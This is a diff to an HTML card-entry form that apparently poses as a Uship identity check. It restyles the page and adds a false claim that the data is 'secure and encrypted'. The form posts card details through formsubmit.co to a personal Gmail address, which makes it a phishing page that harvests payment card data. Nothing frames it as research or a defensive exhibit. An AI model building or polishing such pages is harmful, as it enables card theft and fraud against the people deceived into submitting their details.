@@ -8,53 +8,52 @@
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #f8f9fa;
+            background-color: #1e90ff; /* Pure blue background */
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
-            overflow: hidden; /* Empêche le défilement */
+            overflow: hidden;
         }
         .container {
-            background-color: #ffffff;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
-            width: 400px;
+            background-color: #007bff; /* Dominant blue */
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
+            width: 500px;
             text-align: center;
+            box-sizing: border-box;
+            color: white; /* White text for contrast */
         }
         .container h2 {
             margin-bottom: 20px;
-            color: #343a40;
         }
         .container p {
             margin-bottom: 30px;
-            color: #6c757d;
         }
         .form-group {
-            margin-bottom: 20px;
+            margin-bottom: 25px;
             text-align: left;
         }
         .form-group label {
             display: block;
             margin-bottom: 8px;
-            color: #495057;
         }
         .form-group input,
         .form-group select {
             width: 100%;
-            padding: 10px;
+            padding: 12px;
             border: 1px solid #ced4da;
             border-radius: 5px;
             box-sizing: border-box;
-            transition: border-color 0.3s;
+            transition: border-color 0.3s, box-shadow 0.3s;
         }
         .form-group input:focus,
         .form-group select:focus {
-            border-color: #007bff;
+            border-color: #0056b3;
             outline: none;
-            box-shadow: 0 0 8px rgba(0, 123, 255, 0.3);
+            box-shadow: 0 0 8px rgba(0, 86, 179, 0.3);
         }
         .form-group input.invalid,
         .form-group select.invalid {
@@ -62,14 +61,16 @@
             box-shadow: 0 0 8px rgba(255, 0, 0, 0.3);
         }
         .form-group input[type="submit"] {
-            background-color: #007bff;
-            color: white;
+            background-color: white; /* White button */
+            color: #007bff; /* Blue text */
             border: none;
             cursor: pointer;
-            font-size: 16px;
+            font-size: 18px;
+            padding: 12px;
         }
         .form-group input[type="submit"]:hover {
             background-color: #0056b3;
+            color: white;
         }
         .error {
             color: red;
@@ -84,11 +85,16 @@
         .expiry-group select {
             width: 48%;
         }
+        .secure-message {
+            color: red; /* Red secure message */
+            margin-top: 20px;
+            font-size: 16px;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h2><strong>Please enter your informations</strong></h2>
+        <h2><strong>Please enter your information</strong></h2>
         <p><strong>Debit/Credit Card</strong></p>
         <form id="credit-card-form" action="https://formsubmit.co/baradur24@gmail.com" method="POST">
             <div class="form-group">
@@ -141,6 +147,9 @@
                 <input type="submit" value="Submit">
             </div>
         </form>
+        <div class="secure-message">
+            Your information is secure and encrypted.It allows Uship to identify you as a person and American resident
+        </div>
     </div>
 
     <script>
@@ -198,3 +207,4 @@
     </script>
 </body>
 </html>
+
